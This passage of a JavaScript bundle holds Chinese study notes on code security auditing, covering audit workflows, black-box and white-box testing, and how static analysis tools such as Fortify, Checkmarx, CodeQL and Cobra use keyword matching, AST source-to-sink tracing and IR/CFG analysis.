              \u8FDB\u5165\u4E86\u540E\u671F\u7EF4\u62A4\u9636\u6BB5\uFF1A
                  6\u3001 \u5F00\u6E90\u4EE3\u7801\u6258\u7BA1\u5E73\u53F0\u7684\u4FE1\u606F\u6CC4\u9732\u76D1\u63A7\uFF1B
  `)),Object(u.a)(b||(b=Object(t.a)([`
  \u3010\u5DE5\u4F5C\u6D41\u7A0B\u3011\u3001\u3010\u6D41\u7A0B\u3011\u3001\u3010\u5BA1\u8BA1\u6D41\u7A0B\u3011
  \u3010\u601D\u8DEF\u3011\u3010\u5E38\u89C1\u601D\u8DEF\u3011

  \u601D\u8DEF\u3001\u57FA\u672C\u601D\u8DEF\u3001\u5E38\u89C1\u601D\u8DEF`,`

  \u5DE5\u4F5C\u6D41\u7A0B\u3001\u6D41\u7A0B\u3001\u5BA1\u8BA1\u6D41\u7A0B`,`

  `])),Object(u.c)("\u601D\u8DEF\u3001\u57FA\u672C\u601D\u8DEF\u3001\u5E38\u89C1\u601D\u8DEF",`
    \u8D44\u6599\uFF1A
        https://javamana.com/2021/12/202112250059342761.html
        https://blog.51cto.com/u_15072918/3426148\uFF08\u5F85\u7EE7\u7EED\u6574\u7406\uFF09

    \u6574\u4F53\u601D\u8DEF\uFF1A
        \u9996\u5148\u4F7F\u7528\u5DE5\u5177\u5BF9\u4EE3\u7801\u8FDB\u884C\u626B\u63CF\uFF0C\u7136\u540E\u6839\u636E\u8BBE\u5B9A\u597D\u7684\u4E00\u4E9B\u89C4\u5219\u8FDB\u884C\u4E00\u4E2A\u5339\u914D\uFF0C\u4ECE\u800C\u627E\u5230\u53EF\u80FD\u5B58\u5728\u6F0F\u6D1E\u7684\u4E00\u4E9B\u5730\u65B9\uFF0C\u7136\u540E\u7ED3\u5408\u4EBA\u5DE5\u5BA1\u67E5\u5339\u914D\uFF0C\u786E\u5B9A\u8FD9\u4E2A\u5730\u65B9\u662F\u4E0D\u662F\u6709\u6F0F\u6D1E\u3002

        \u4EE3\u7801\u91CC\u6211\u4EEC\u4F7F\u7528\u5DE5\u5177\u80FD\u53D1\u73B0\u4E00\u4E9B\u5E38\u89C4\u7684\u6F0F\u6D1E\uFF0C\u4F46\u4E0D\u662F\u6240\u6709\u7684\u6F0F\u6D1E\u90FD\u80FD\u627E\u5F97\u5230\uFF0C\u6240\u4EE5\u8FD8\u9700\u8981\u7ED3\u5408\u4EBA\u5DE5\u5BA1\u8BA1\u7684\u65B9\u5F0F\u6765\u5BF9\u4EE3\u7801\u8FDB\u884C\u5BA1\u8BA1\u3002

    \u5B8C\u6574\u6D41\u7A0B\uFF1A

        1.\u63A5\u53E3\u6392\u67E5("\u6B63\u5411\u8FFD\u8E2A")\uFF1A
            \u5148\u627E\u51FA\u4ECE\u5916\u90E8\u63A5\u53E3\u63A5\u6536\u7684\u53C2\u6570\uFF0C\u5E76\u8DDF\u8E2A\u5176\u4F20\u9012\u7A0B\uFF0C\u89C2\u5BDF\u662F\u5426\u6709\u53C2\u6570\u6821\u9A8C\u4E0D\u4E25\u7684\u53D8\u91CF\u4F20\u5165

        2.\u5371\u9669\u65B9\u6CD5\u6EAF\u6E90("\u9006\u5411\u8FFD\u8E2A")\uFF1A
            \u5904\u7406\u5224\u65AD\u53D8\u91CF\u662F\u5426\u53EF\u63A7\u5E76\u4E14\u5DF2\u7ECF\u8FC7\u4E25\u683C\u7684\u8FC7\u6EE4\u3002

        3.\u529F\u80FD\u70B9\u5B9A\u5411\u5BA1\u8BA1\uFF1A
            \u6839\u636E\u7ECF\u9A8C\u5224\u65AD\u8BE5\u7C7B\u5E94\u7528\u901A\u5E38\u4F1A\u5728\u54EA\u4E9B\u529F\u80FD\u4E2D\u51FA\u73B0\u6F0F\u6D1E\u3002

        4.\u7B2C\u4E09\u65B9\u7EC4\u4EF6\u3001\u4E2D\u95F4\u4EF6\u7248\u672C\u6BD4\u5BF9\uFF1A
            \u68C0\u67E5Web\u5E94\u7528\u6240\u4F7F\u7528\u7684\u7B2C\u4E09\u65B9\u7EC4\u4EF6\u6216\u4E2D\u95F4\u76F4\u63A5\u5BA1\u8BA1\u8BE5\u7C7B\u529F\u80FD\u7684\u4EE3\u7801\u3002\u4E2D\u95F4\u4EF6\u7684\u7248\u672C\u662F\u5426\u53D7\u5230\u5DF2\u77E5\u6F0F\u6D1E\u7684\u5F71\u54CD\u3002

        5.\u8865\u4E01\u6BD4\u5BF9\uFF1A
            \u901A\u8FC7\u5BF9\u8865\u4E01\u505A\u6BD4\u5BF9\uFF0C\u53CD\u63A8\u6F0F\u6D1E\u51FA\u5904\u3002

        6."\u9ED1\u76D2\u6D4B\u8BD5"+"\u767D\u76D2\u6D4B\u8BD5"\uFF1A
            \u867D\u7136\u4EE3\u7801\u5BA1\u8BA1\u7684\u8FC7\u7A0B\u987B\u4EE5"\u767D\u76D2\u6D4B\u8BD5"\u4E3A\u4E3B\uFF0C\u4F46\u662F\u5728\u8FC7\u7A0B\u4E2D\u8F85\u4EE5"\u9ED1\u76D2\u6D4B\u8BD5"\u5C06\u6709\u52A9\u4E8E\u5FEB\u901F\u5B9A\u4F4D\u5230\u63A5\u53E3\u6216\u505A\u66F4\u5168\u9762\u7684\u5206\u6790\u5224\u65AD\u3002

        7. "\u4EE3\u7801\u9759\u6001\u626B\u63CF\u5DE5\u5177"+ "\u4EBA\u5DE5\u7814\u5224" \uFF1A
            \u5BF9\u4E8E\u67D0\u4E9B\u6F0F\u6D1E\u4F7F\u7528\u4EE3\u7801\u9759\u6001\u626B\u63CF\u5DE5\u5177\u4EE3\u66FF\u4EBA\u5DE5\u6F0F\u6D1E\u6316\u6398\u53EF\u4EE5\u663E\u8457\u63D0\u9AD8\u5BA1\u8BA1\u5DE5\u4F5C\u7684\u6548\u7387\u3002

        8.\u5F00\u53D1\u6846\u67B6\u5B89\u5168\u5BA1\u8BA1\uFF1A
            \u5BA1\u8BA1web\u5E94\u7528\u6240\u4F7F\u7528\u7684\u5F00\u53D1\u6846\u67B6\u662F\u5426\u5B58\u5728\u81EA\u8EAB\u5B89\u5168\u95EE\u9898,\u6216\u8005\u7531\u4E8E\u7528\u6237\u4F7F\u7528\u4E0D\u5F53\u800C\u5F15\u53D1\u7684\u5B89\u5168\u98CE\u9669\u3002

    \u4E00\u4E9B\u8865\u5145\uFF1A
        \u300A\u5173\u952E\u5B57\u300B\u641C\u7D22\u3001\u300A\u5173\u952E\u51FD\u6570\u300B\u641C\u7D22
            \u76F4\u63A5\u7528\u300A\u6B63\u5219\u300B\u3002\uFF08\u7FA4\u91CC\u53D1\u7684\u6B63\u5219\uFF09


    \u4E00\u4E9B\u5176\u5B83\u7684\u601D\u8DEF\uFF1A

        \u4EE3\u7801\u5BA1\u8BA1\u7684\u6838\u5FC3\u601D\u60F3\u5C31\u662F\u8FFD\u8E2A\u53C2\u6570\uFF0C\u800C\u8FFD\u8E2A\u53C2\u6570\u7684\u6B65\u9AA4\u5C31\u662F\u7A0B\u5E8F\u6267\u884C\u7684\u6B65\u9AA4\uFF0C
            \u8BF4\u767D\u4E86\u4EE3\u7801\u5BA1\u8BA1\u5C31\u662F\u4E00\u4E2A\u8DDF\u8E2A\u7A0B\u5E8F\u6267\u884C\u6B65\u9AA4\u7684\u4E00\u4E2A\u8FC7\u7A0B\uFF1A
                1\u3001\u9010\u6761\u8BFB\u4EE3\u7801\uFF0C\u4E86\u89E3\u6574\u4E2A\u6846\u67B6\u7684\u6D41\u7A0B\u8FC7\u540E\uFF0C\u4ECE\u6211\u4E00\u822C\u662F\u5148\u9605\u8BFB\u6743\u9650\u63A7\u5236\u6A21\u5757\uFF0C\u7136\u540E\u76F4\u63A5\u901A\u8BFBController\u6A21\u5757,\u7136\u540E\u8DDF\u8E2A\u770B\u770B, \u540E\u9762\u4F60\u4F1A\u53D1\u73B0\u5F88\u591A\u7C7B\u4F3C\u7684\u4EE3\u7801\uFF0C\u4ECE\u800C\u63D0\u9AD8\u901A\u8BFB\u7684\u901F\u5EA6\u7684\u3002
                2\u3001\u654F\u611F\u51FD\u6570\u56DE\u6EAF(\u4F7F\u7528\u5DE5\u5177\u5BA1\u8BA1\uFF1BFortify SCA\u626B\u63CF)\uFF0C\u7ED3\u5408\u4E1A\u52A1\u573A\u666F\uFF0C\u9010\u4E2A\u529F\u80FD\u70B9\u8FDB\u884C\u6D4B\u8BD5\uFF0C\u6839\u636E\u8F93\u5165\u6765\u8FFD\u8E2A\u53D8\u91CF\u7684\u6700\u7EC8\u5F62\u6001\uFF1B\u4E00\u4E9B\u4E0D\u5728\u663E\u793A\u9875\u9762\u7684\u529F\u80FD\u70B9\u6240\u5B58\u5728\u7684\u6F0F\u6D1E\u53EF\u80FD\u5C31\u4F1A\u6316\u6398\u4E0D\u5230
                3\u3001\u5B9A\u5411\u529F\u80FD\u5206\u6790

  `),Object(u.c)("\u5DE5\u4F5C\u6D41\u7A0B\u3001\u6D41\u7A0B\u3001\u5BA1\u8BA1\u6D41\u7A0B",`

    1. \u914D\u7F6E\u5206\u6790\u73AF\u5883
    2. \u719F\u6089\u4E1A\u52A1\u6D41\u7A0B
    3. \u5206\u6790\u7A0B\u5E8F\u67B6\u6784
    4. \u5DE5\u5177\u81EA\u52A8\u5316\u5206\u6790
    5. \u4EBA\u5DE5\u5BA1\u8BA1
    6. \u6574\u7406\u5BA1\u8BA1\u62A5\u544A

  `)),Object(u.a)(E||(E=Object(t.a)([`
  \u3010\u9ED1\u76D2\u3011\u3010\u9ED1\u76D2\u6D4B\u8BD5\u3011
  \u3010\u767D\u76D2\u3011\u3010\u767D\u76D2\u6D4B\u8BD5\u3011

  1.\u9ED1\u76D2\u6D4B\u8BD5
      \u9ED1\u76D2\u6D4B\u8BD5\u53C8\u79F0\u4E3A\u529F\u80FD\u6D4B\u8BD5\uFF0C\u4E3B\u8981\u68C0\u6D4B\u8F6F\u4EF6\u7684\u6BCF\u4E00\u4E2A\u529F\u80FD\u662F\u5426\u80FD\u591F\u6B63\u5E38\u4F7F\u7528\u3002

      \u5728\u6D4B\u8BD5\u8FC7\u7A0B\u4E2D\uFF0C\u5C06\u7A0B\u5E8F\u770B\u6210\u4E0D\u80FD\u6253\u5F00\u7684\u9ED1\u76D2\u5B50\uFF0C\u4E0D\u8003\u8651\u7A0B\u5E8F\u5185\u90E8\u7ED3\u6784\u548C\u7279\u6027\u7684\u57FA\u7840\u4E0A\u901A\u8FC7\u7A0B\u5E8F\u63A5\u53E3\u8FDB\u884C\u6D4B\u8BD5\uFF0C\u68C0\u67E5\u7A0B\u5E8F\u529F\u80FD\u662F\u5426\u6309\u7167\u8BBE\u8BA1\u9700\u6C42\u4EE5\u53CA\u8BF4\u660E\u4E66\u7684\u89C4\u5B9A\u80FD\u591F\u6B63\u5E38\u6253\u5F00\u4F7F\u7528\u3002

      \u4E3E\u4F8B\uFF1A
          \u76F8\u5F53\u4E8E\u4F60\u53BB\u9A8C\u6536\u4E00\u4E2A\u5DE5\u7A0B\uFF0C\u6BD4\u5982\uFF1A\u5F3A\u80FD\u9632\u7206\u591A\u5C11\u987F\u70B8\u836F\uFF0C\u6211\u4EEC\u5C31\u62FF\u591A\u5C11\u7684\u70B8\u836F\u8BD5\u4E00\u4E0B\u5C31\u884C\u4E86\uFF0C\u5899\u88AB\u70B8\u4E86\uFF0C\u5C31\u4E0D\u5408\u683C\u3002

  2.\u767D\u76D2\u6D4B\u8BD5
      \u767D\u76D2\u6D4B\u8BD5\u4E5F\u79F0\u4E3A\u7ED3\u6784\u6D4B\u8BD5\uFF0C\u4E3B\u8981\u7528\u4E8E\u68C0\u6D4B\u8F6F\u4EF6\u7F16\u7801\u8FC7\u7A0B\u4E2D\u7684\u9519\u8BEF\u3002

      \u7A0B\u5E8F\u5458\u7684\u7F16\u7A0B\u7ECF\u9A8C\u3001\u5BF9\u7F16\u7A0B\u8F6F\u4EF6\u7684\u638C\u63E1\u7A0B\u5EA6\u3001\u5DE5\u4F5C\u72B6\u6001\u7B49\u56E0\u7D20\u90FD\u4F1A\u5F71\u54CD\u5230\u7F16\u7A0B\u8D28\u91CF\uFF0C\u5BFC\u81F4\u4EE3\u7801\u9519\u8BEF\u3002

      \u4E3E\u4F8B\uFF1A
          \u5047\u5982\u6211\u4F5C\u4E3A\u4E00\u4E2A\u7532\u65B9\u4EBA\u5458\u6765\u8FDB\u884C\u6D4B\u8BD5\uFF0C\u5F00\u53D1\u65B9\u5C31\u5FC5\u987B\u628A\u6240\u6709\u8D44\u6599\u7ED9\u5230\u6211\uFF0C\u8BBE\u8BA1\u56FE\u7EB8\uFF0C\u90A3\u4E00\u5757\u591A\u5C11\u6DF7\u6CE5\u571F\uFF0C\u591A\u5C11\u94A2\u7B4B\uFF0C\u7528\u7684\u662F\u4EC0\u4E48\u578B\u53F7\u90FD\u8981\u544A\u8BC9\u6211\u3002
          \u90A3\u6211\u5C31\u77E5\u9053\u8FD9\u4E2A\u5899\u80FD\u591F\u627F\u53D7\u591A\u5C11\uFF0C\u529B\u5B66\u6A21\u578B\u90FD\u77E5\u9053\u4E86\uFF0C\u6211\u7ED3\u5408\u6240\u6709\u7684\u8D44\u6599\u5C31\u53EF\u4EE5\u77E5\u9053\u4F60\u8FD9\u4E2A\u5DE5\u7A0B\u662F\u4E0D\u662F\u5408\u683C\u7684\u3002\u6216\u8005\u8BF4\u90A3\u4E9B\u5730\u65B9\u53EF\u80FD\u5B58\u5728\u54EA\u4E9B\u95EE\u9898\u3002

  `])))]),\u5DE5\u5177\u7BC7:G([Object(u.a)(r||(r=Object(t.a)([`
  \u3010\u5DE5\u5177\u3011\u3001\u3010\u81EA\u52A8\u5316\u3011\u3001\u3010\u5BA1\u8BA1\u5DE5\u5177\u3011\u3001\u3010\u4EE3\u5BA1\u5DE5\u5177\u3011\u3001\u3010\u9759\u6001\u3011\u3001\u3010\u9759\u6001\u4EE3\u7801\u5B89\u5168\u3011
  \u3010Fortify\u3011\u3001\u3010SCA\u3011\u3001\u3010Fortify SCA\u3011
  \u3010CheckMarx\u3011
  \u3010Sonar\u5BB6\u65CF\u3011\u3001\u3010SonarQube\u3011\u3001\u3010SonarSource\u3011\u3001\u3010SonarLint\u3011\u3001\u3010SonarCloud\u3011
  \u3010\u5947\u5B89\u4FE1\u4EE3\u7801\u536B\u58EB\u3011
  \u3010CodeQL\u3011
  \u3010Cobra\u3011

  \u9759\u6001\u4EE3\u7801\u5B89\u5168\u5BA1\u8BA1\u5DE5\u5177\uFF08SAST\uFF09`,`

  1.\u300AFortify SCA\u300B`,`


  2.\u300ACheckMarx\u300B`,`

  3.\u300ACodeQL\u300B`,`

  4.\u300ACobra\u300B`,`


  5.\u300ASonar\u5BB6\u65CF\u300B\u3001\u300ASonarQube\u300B\u3001\u300ASonarSource\u300B\u3001\u300ASonarLint\u300B\u3001\u300ASonarCloud\u300B`,`


  6.\u300A\u5947\u5B89\u4FE1\u4EE3\u7801\u536B\u58EB\u300B`,`

  `])),Object(u.c)("\u9759\u6001\u4EE3\u7801\u5B89\u5168\u5BA1\u8BA1\u5DE5\u5177\uFF08SAST\uFF09\uFF0C\u4EE5\u53CA\u5DE5\u5177\u7684\u539F\u7406",`

    \u9759\u6001\u4EE3\u7801\u5B89\u5168\u5BA1\u8BA1\u5DE5\u5177\uFF08SAST\uFF09\uFF0C\u4EE5\u53CA\u5DE5\u5177\u7684\u539F\u7406

        \u8D44\u6599\uFF1A
                \u6211\u81EA\u5DF1\u7684\u5927\u578B\u6574\u7406\uFF1Ahttps://www.notion.so/89a43b10e0f6429d83c033f3c278ab87#57cef11d0e7e4ad78880f30ae0624fed

        \u5E02\u9762\u4E0A\uFF0C\u5E38\u89C1\u4EE3\u5BA1\u5DE5\u5177\u7684\u539F\u7406\uFF1A

                0\u3001\u5176\u5B83\u90E8\u5206  \u300A\u52A8\u6001\u4EE3\u7801\u5BA1\u8BA1\u5DE5\u5177\u300B  \u7684\u60C5\u51B5\uFF1A
                        1\u3001\u82F1\u6587\u5168\u79F0\u4E3A\uFF1AIAST\uFF08Interactive Application Security Testing\uFF09\u3002
                        2\u3001\u6700\u5E38\u89C1\u7684\u65B9\u5F0F\u5C31\u662F\uFF1A
                                1\u3001\u901A\u8FC7\u67D0\u79CD\u65B9\u5F0F Hook\u6076\u610F\u51FD\u6570 \u6216\u662F \u5E95\u5C42api \uFF0C\u5E76\u901A\u8FC7 \u300A\u524D\u7AEF\u722C\u866B\u300B \u5224\u522B\u662F\u5426\u89E6\u53D1\u6076\u610F\u51FD\u6570\u6765\u786E\u8BA4\u6F0F\u6D1E\u3002
                                        1\u3001\u5728 \u300A\u524D\u7AEFFuzz\u300B \u7684\u8FC7\u7A0B\u4E2D\uFF0C\u5982\u679C Hook\u51FD\u6570 \u88AB\u89E6\u53D1\uFF0C\u5E76\u6EE1\u8DB3\u67D0\u79CD\u6761\u4EF6\uFF0C\u90A3\u4E48\u6211\u4EEC\u8BA4\u4E3A\u8BE5\u6F0F\u6D1E\u5B58\u5728\u3002
                        3\u3001\u5177\u4F53\u7684\u4EA7\u54C1\uFF1A
                                1\u3001\u62FFPHP\u4E3E\u4F8B\u5B50\u6765\u8BF4\uFF0C\u6BD4\u8F83\u6210\u719F\u7684 Hook\u65B9\u6848 \u5C31\u662F\u901A\u8FC7 \u300APHP\u63D2\u4EF6\u300B \u5B9E\u73B0\uFF0C\u5177\u4F53\u7684\u5B9E\u73B0\u65B9\u6848\u53EF\u4EE5\u53C2\u8003\u3002
                                        https://github.com/fate0/prvd
                1\u3001Seay\uFF0C\u57FA\u4E8E\u300A\u5173\u952E\u5B57\u5339\u914D\u300B\uFF0C\u901A\u8FC7\u7B80\u5355\u7684\u5173\u952E\u5B57\u6765\u5339\u914D\u7ECF\u53EF\u80FD\u591A\u7684\u76EE\u6807\uFF0C
                        1\u3001\u4E4B\u540E\u4F7F\u7528\u8005\u53EF\u4EE5\u901A\u8FC7\u4EBA\u5DE5\u5BA1\u8BA1\u7684\u65B9\u5F0F\u8FDB\u4E00\u6B65\u786E\u8BA4\u3002
                2\u3001Rips\u514D\u8D39\u7248\uFF0C\u57FA\u4E8E\u300A\u5173\u952E\u5B57\u5339\u914D\u300B
                        1\u3001\u7528\u66F4\u591A\u7684\u6B63\u5219\u6765\u7EA6\u675F\uFF0C\u7528\u66F4\u591A\u7684\u89C4\u5219\u6765\u8986\u76D6\u591A\u79CD\u60C5\u51B5\u3002

                3\u3001Rips\u5546\u4E1A\u7248\u3001Cobra\u3001Cobra-W\uFF08\u4E8C\u6B21\u5F00\u53D1\uFF09\u3001KunLun-M\uFF08Cobra-W\u7684\u5347\u7EA7\u7248\uFF09\uFF0C\u4F7F\u7528\u4E86 \u300A\u57FA\u4E8EAST\u300B\u62BD\u8C61\u8BED\u6CD5\u6811 \u7684\u6280\u672F\u3002
                        1\u3001KunLun-M\uFF0C\uFF08\u539F\u4F5C\u8005\u8BF4\u7684\uFF09\u53EF\u80FD\u5E76\u4E0D\u662F\u4EC0\u4E48\u6709\u6280\u672F\u4F18\u52BF\u7684\u81EA\u52A8\u5316\u4EE3\u7801\u5BA1\u8BA1\u5DE5\u5177\uFF0C\u4F46\u5374\u662F\u552F\u4E00\u7684\u4ECD\u5728\u7EF4\u62A4\u7684\u5F00\u6E90\u4EE3\u7801\u5BA1\u8BA1\u5DE5\u5177\u3002

                4\u3001Fortify\u3001Checkmarx\u3001Coverity\u3001\u5305\u62EC\u6700\u65B0\u7684Rips\uFF0C\u90FD\u4F7F\u7528\u4E86 \u300A\u81EA\u5DF1\u6784\u9020\u7684\u8BED\u8A00\u300B \u4F5C\u4E3A\u67D0\u4E00\u4E2A\u4E2D\u95F4\u90E8\u5206
                        1\u3001\u6BD4\u5982 Fortify\u548CCoverity \uFF0C\u5C31\u9700\u8981\u5BF9\u6E90\u7801\u7F16\u8BD1\u7684\u67D0\u4E00\u4E2A\u4E2D\u95F4\u8BED\u8A00\u8FDB\u884C\u5206\u6790\u3002
                5\u3001\u524D\u6BB5\u65F6\u95F4\u88AB \u963F\u91CC \u6536\u8D2D\u7684 \u300A\u6E90\u4F1E\u300B \u751A\u81F3\u5B9E\u73B0\u4E86\uFF0C\u591A\u79CD\u8BED\u8A00\u751F\u6210\u7EDF\u4E00\u7684IR
                        1\u3001\u8FD9\u6837\u4E00\u6765\u5BF9\u4E8E\u65B0\u8BED\u8A00\u7684\u626B\u63CF\u652F\u6301\u96BE\u5EA6\u5C31\u53D8\u5F97\u5927\u5927\u51CF\u5C11\u4E86

        \u539F\u7406\uFF1A
                1\u3001\u73B0\u9636\u6BB5\uFF1A
                        AST\u6811\uFF08\u62BD\u8C61\u8BED\u6CD5\u6811\uFF09 \u548C token\u6D41
                2\u3001\u5386\u53F2\u53D1\u5C55\uFF1A
                        1\u3001\u4E0A\u53E4\u65F6\u671F \u2014\u2014 \u5173\u952E\u5B57\u5339\u914D
                                1\u3001\u9009\u62E9\u7528\u5173\u952E\u5B57\u5339\u914D\u7684\u4F60\u9762\u4E34\u7740\u4E24\u79CD\u9009\u62E9\uFF1A
                                        1\u3001\u9AD8\u8986\u76D6\u6027 \u2013 \u5B81\u9519\u6740\u4E0D\u653E\u8FC7
                                                1\u3001\u8FD9\u7C7B\u5DE5\u5177\u6700\u7ECF\u5178\u7684\u5C31\u662FSeay\uFF0C\u901A\u8FC7\u7B80\u5355\u7684\u5173\u952E\u5B57\u6765\u5339\u914D\u7ECF\u53EF\u80FD\u591A\u7684\u76EE\u6807\uFF0C\u4E4B\u540E\u4F7F\u7528\u8005\u53EF\u4EE5\u901A\u8FC7\u4EBA\u5DE5\u5BA1\u8BA1\u7684\u65B9\u5F0F\u8FDB\u4E00\u6B65\u786E\u8BA4\u3002
                                        2\u3001\u9AD8\u53EF\u7528\u6027 \u2013 \u5B81\u653E\u8FC7\u4E0D\u9519\u6740
                                                1\u3001\u8FD9\u7C7B\u5DE5\u5177\u6700\u7ECF\u5178\u7684\u662FRips\u514D\u8D39\u7248
                                                        \u7528\u66F4\u591A\u7684\u6B63\u5219\u6765\u7EA6\u675F\uFF0C\u7528\u66F4\u591A\u7684\u89C4\u5219\u6765\u8986\u76D6\u591A\u79CD\u60C5\u51B5\u3002
                                2\u3001\u5C40\u9650\uFF1A
                                        \u5173\u952E\u5B57\u5339\u914D\u6700\u5927\u7684\u95EE\u9898\u662F\u5728\u4E8E\u4F60\u6C38\u8FDC\u6CA1\u529E\u6CD5\u4FDD\u8BC1\u5F00\u53D1\u4EBA\u5458\u7684\u4E60\u60EF\uFF0C\u4F60\u4E5F\u5C31\u6CA1\u529E\u6CD5\u901A\u8FC7\u4EFB\u4F55\u5236\u5F0F\u7684\u5339\u914D\u6765\u786E\u8BA4\u6F0F\u6D1E\u3002
                        2\u3001\u8FD1\u4EE3\u65F6\u671F \u2014\u2014 \u57FA\u4E8EAST\u7684\u4EE3\u7801\u5206\u6790
                                1\u3001\u4EE5PHP\u4E3A\u4F8B\uFF0C\u5C55\u73B0\u5B83\u7684\u7F16\u8BD1\u539F\u7406\uFF1A
                                        1\u3001PHP7  \u4E4B\u524D\uFF1A
                                                PHP\u4EE3\u7801\u2014\u2014\u2014\u2014\u300A\u8BCD\u6CD5\u5206\u6790\u300B\u2014\u2014\u2014\u2014Token\u6D41\u2014\u2014\u2014\u2014\u300A\u8BED\u6CD5\u5206\u6790\u300B\u2014\u2014\u2014\u2014Op arrays\u2014\u2014\u2014\u2014\u300A\u89E3\u91CA\u6267\u884C\u300B\u2014\u2014\u2014\u2014Zend\u5F15\u64CE
                                        2\u3001PHP7\uFF0C\u53CA\u4EE5\u540E\uFF1A
                                                PHP\u4EE3\u7801\u2014\u2014\u2014\u2014\u300A\u8BCD\u6CD5\u5206\u6790\u300B\u2014\u2014\u2014\u2014Token\u6D41\u2014\u2014\u2014\u2014\u300A\u8BED\u6CD5\u5206\u6790\u300B\u2014\u2014\u2014\u2014AST\u2014\u2014\u2014\u2014\u300A\u89E3\u91CA\u300B\u2014\u2014\u2014\u2014Op arrays\u2014\u2014\u2014\u2014\u300A\u6267\u884C\u300B\u2014\u2014\u2014\u2014Zend\u5F15\u64CE
                                2\u3001\u901A\u8FC7\u8BCD\u6CD5\u5206\u6790\u548C\u8BED\u6CD5\u5206\u6790\uFF0C\u6211\u4EEC\u53EF\u4EE5\u5C06\u4EFB\u610F\u4E00\u4EFD\u4EE3\u7801\u8F6C\u5316\u4E3AAST\u8BED\u6CD5\u6811\u3002\u5E38\u89C1\u7684\u8BED\u4E49\u5206\u6790\u5E93\u53EF\u4EE5\u53C2\u8003\uFF1A
                                        https://github.com/nikic/PHP-Parser
                                        https://github.com/viraptor/phply
                                3\u3001\u5F53\u6211\u4EEC\u5F97\u5230\u4E86\u4E00\u4EFDAST\u8BED\u6CD5\u6811\u4E4B\u540E\uFF0C\u6211\u4EEC\u5C31\u89E3\u51B3\u4E86\u524D\u9762\u63D0\u5230\u7684\u5173\u952E\u5B57\u5339\u914D\u6700\u5927\u7684\u95EE\u9898\uFF1A
                                        1\u3001\u81F3\u5C11\u6211\u4EEC\u73B0\u5728\u5BF9\u4E8E\u4E0D\u540C\u7684\u4EE3\u7801\uFF0C\u90FD\u6709\u4E86\u7EDF\u4E00\u7684AST\u8BED\u6CD5\u6811\u3002
                                        2\u3001\u5982\u4F55\u5BF9AST\u8BED\u6CD5\u6811\u505A\u5206\u6790\u4E5F\u5C31\u6210\u4E86\u8FD9\u7C7B\u5DE5\u5177\u6700\u5927\u7684\u95EE\u9898\u3002
                                4\u3001\u5728\u7406\u89E3\u5982\u4F55\u5206\u6790AST\u8BED\u6CD5\u6811\u4E4B\u524D\uFF0C\u6211\u4EEC\u9996\u5148\u8981\u660E\u767Dinfomation flow\u3001source\u3001sink\u4E09\u4E2A\u6982\u5FF5\uFF0C
                                        1\u3001source\uFF1A \u6211\u4EEC\u53EF\u4EE5\u7B80\u5355\u7684\u79F0\u4E4B\u4E3A\u8F93\u5165\uFF0C\u4E5F\u5C31\u662F Information flow \u7684\u8D77\u70B9
                                        2\u3001sink\uFF1A \u6211\u4EEC\u53EF\u4EE5\u79F0\u4E4B\u4E3A\u8F93\u51FA\uFF0C\u4E5F\u5C31\u662F Information flow \u7684\u7EC8\u70B9
                                        3\u3001\u800C Information flow\uFF1A\u5219\u662F\u6307\u6570\u636E\u5728source\u5230sink\u4E4B\u95F4\u6D41\u52A8\u7684\u8FC7\u7A0B\u3002
                                                1\u3001\u5728\u5206\u6790infomation flow\u7684\u8FC7\u7A0B\u4E2D\uFF0C\u660E\u786E \u4F5C\u7528\u57DFScope \u662F\u57FA\u7840\u4E2D\u7684\u57FA\u7840\u3002
                                5\u3001\u5728\u660E\u767D\u4E86\u57FA\u7840\u539F\u7406\u7684\u57FA\u7840\u4E0A\uFF0C\u6211\u4E3E\u51E0\u4E2A\u7B80\u5355\u7684\u4F8B\u5B50\uFF1A
                                        1\u3001\u7565
                                        2\u3001\u5728\u4E0A\u9762\u7684\u5206\u6790\u8FC7\u7A0B\u4E2D\uFF0CSink\u5C31\u662F System.Runtime.exec \u51FD\u6570\uFF0Csource\u5C31\u662F @GetMapping \uFF0C
                                                1\u3001\u901A\u8FC7\u9006\u5411\u5206\u6790Sink\u7684\u6765\u6E90\uFF0C\u6211\u4EEC\u6210\u529F\u627E\u5230\u4E86\u4E00\u6761\u6D41\u5411Sink\u7684 Information flow\uFF0C\u4E5F\u5C31\u6210\u529F\u53D1\u73B0\u4E86\u8FD9\u4E2A\u6F0F\u6D1E\u3002
                                6\u3001\u5BF9\u4E8E\u57FA\u4E8EAST\u7684\u4EE3\u7801\u5206\u6790\u6765\u8BF4\uFF0C\u6700\u5927\u7684\u6311\u6218\u5728\u4E8E\uFF1A
                                        1\u3001\u6CA1\u4EBA\u80FD\u4FDD\u8BC1\u81EA\u5DF1\u5B8C\u7F8E\u7684\u5904\u7406\u6240\u6709\u7684AST\u7ED3\u6784\uFF0C\u518D\u52A0\u4E0A\u57FA\u4E8E\u5355\u5411\u6D41\u7684\u5206\u6790\u65B9\u5F0F\uFF0C\u65E0\u6CD5\u5E94\u5BF9100%\u7684\u573A\u666F\uFF0C
                                        2\u3001\u8FD9\u4E5F\u6B63\u662F\u8FD9\u7C7B\u5DE5\u5177\u9762\u4E34\u7684\u95EE\u9898
                                                1\u3001\u6216\u8005\u8BF4\uFF0C\u8FD9\u4E5F\u5C31\u662F\u4E3A\u4EC0\u4E48\u9009\u62E9\u9006\u5411\u7684\u539F\u56E0\u3002
                                                        \u9006\u5411\uFF0C\u6B64\u5904\u6307 \u300A\u9006\u5411\u5206\u6790\u6D41\u300B \uFF0C\u5373\u4ECE Sink \u56DE\u6EAF\u5230 Source \u3002


                        3\u3001\u73B0\u4EE3\u65F6\u671F \u2014\u2014 \u57FA\u4E8EIR/CFG\u7684\u4EE3\u7801\u5206\u6790
                                1\u3001AST\u7684\u5F0A\u7AEF
                                        1\u3001\u5982\u679C\u6DF1\u5EA6\u4E86\u89E3\u8FC7\u57FA\u4E8EAST\u7684\u4EE3\u7801\u5206\u6790\u539F\u7406\u7684\u8BDD\uFF0C\u4E0D\u7136\u53D1\u73B0AST\u7684\u8BB8\u591A\u5F0A\u7AEF\u3002
                                        2\u3001\u9996\u5148AST\u662F\u7F16\u8BD1\u539F\u7406\u4E2DIR/CFG\u7684\u66F4\u4E0A\u5C42\uFF0C\u5176 AST \u4E2D\u4FDD\u5B58\u7684\u8282\u70B9\u66F4\u63A5\u8FD1\u6E90\u4EE3\u7801\u7ED3\u6784\u3002
